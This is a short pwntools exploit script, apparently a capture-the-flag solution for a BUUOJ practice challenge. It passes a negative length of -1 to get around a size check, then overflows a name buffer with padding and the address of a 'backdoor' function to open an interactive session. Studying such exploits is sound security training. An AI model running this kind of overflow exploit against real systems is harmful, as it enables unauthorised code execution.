from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25497)
elf = ELF('./pwn')

io.sendlineafter(b'[+]Please input the length of your name:', b'-1')

io.sendlineafter(b'[+]What\'s u name?', cyclic(16+8) + p64(elf.symbols['backdoor']))

io.interactive()